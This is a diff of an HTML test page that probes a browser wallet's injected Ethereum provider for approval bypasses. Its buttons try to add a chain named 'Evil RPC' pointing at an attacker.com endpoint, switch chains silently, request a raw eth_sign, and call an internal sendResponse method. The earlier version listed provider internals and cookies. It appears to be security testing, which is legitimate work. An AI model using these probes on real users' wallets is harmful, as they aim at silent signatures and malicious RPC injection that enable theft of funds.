@@ -1,36 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Test3</title></head>
+<head><meta charset="UTF-8"><title>Test4</title></head>
 <body>
-<h2>Test</h2>
-<button id="btn" style="font-size:20px;padding:12px">НАЖМИ МЕНЯ</button>
+<h2>Test v4</h2>
+<button id="b1" style="font-size:16px;padding:8px;margin:4px;display:block">1. wallet_addEthereumChain (no approval?)</button>
+<button id="b2" style="font-size:16px;padding:8px;margin:4px;display:block">2. wallet_switchEthereumChain</button>
+<button id="b3" style="font-size:16px;padding:8px;margin:4px;display:block">3. eth_sign (raw sign)</button>
+<button id="b4" style="font-size:16px;padding:8px;margin:4px;display:block">4. sendResponse test</button>
 <div id="out" style="background:#eee;padding:10px;font-size:13px;margin-top:10px"></div>
 <script>
-document.getElementById("btn").onclick = function() {
-    var r = [];
-    r.push("trust: " + typeof window.trust);
-    r.push("_tw_: " + typeof window._tw_);
-    r.push("ethereum: " + typeof window.ethereum);
-    
-    if (window.trust) {
-        try { r.push("trust keys: " + JSON.stringify(Object.getOwnPropertyNames(window.trust))); } catch(e) { r.push("trust keys error: " + e); }
+var out = document.getElementById("out");
+function log(s) { out.innerHTML += s + "<br>"; }
+function clr() { out.innerHTML = ""; }
+
+document.getElementById("b1").onclick = function() {
+    clr();
+    log("Trying wallet_addEthereumChain...");
+    window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+            chainId: "0x539",
+            chainName: "Evil RPC",
+            rpcUrls: ["https://evil-rpc.attacker.com"],
+            nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 }
+        }]
+    }).then(function(r) {
+        log("SUCCESS: " + JSON.stringify(r));
+    }).catch(function(e) {
+        log("Error: " + e.message + " code: " + e.code);
+    });
+};
+
+document.getElementById("b2").onclick = function() {
+    clr();
+    log("Trying wallet_switchEthereumChain to BSC...");
+    window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x38" }]
+    }).then(function(r) {
+        log("SWITCHED: " + JSON.stringify(r));
+    }).catch(function(e) {
+        log("Error: " + e.message + " code: " + e.code);
+    });
+};
+
+document.getElementById("b3").onclick = function() {
+    clr();
+    log("Trying eth_sign...");
+    window.ethereum.request({
+        method: "eth_sign",
+        params: [window.ethereum.address || "0x0", "0xdeadbeef"]
+    }).then(function(r) {
+        log("SIGNED: " + r);
+    }).catch(function(e) {
+        log("Error: " + e.message + " code: " + e.code);
+    });
+};
+
+document.getElementById("b4").onclick = function() {
+    clr();
+    log("Trying sendResponse...");
+    try {
+        var r = window.ethereum.sendResponse(1, "test_payload");
+        log("sendResponse result: " + JSON.stringify(r));
+    } catch(e) {
+        log("Error: " + e.message);
     }
-    if (window._tw_) {
-        try { r.push("_tw_ keys: " + JSON.stringify(Object.getOwnPropertyNames(window._tw_))); } catch(e) { r.push("_tw_ error: " + e); }
-    }
-    if (window.ethereum) {
-        try { r.push("eth address: " + window.ethereum.address); } catch(e) {}
-        try { r.push("eth chainId: " + window.ethereum.chainId); } catch(e) {}
-        try {
-            var proto = Object.getPrototypeOf(window.ethereum);
-            var methods = Object.getOwnPropertyNames(proto).filter(function(k){ return typeof proto[k]==="function"; });
-            r.push("eth methods: " + JSON.stringify(methods));
-        } catch(e) { r.push("eth methods error: " + e); }
-    }
-    r.push("userAgent: " + navigator.userAgent);
-    r.push("cookies: " + (document.cookie || "empty"));
-    
-    document.getElementById("out").innerHTML = r.join("<br>");
 };
 </script>
 </body>
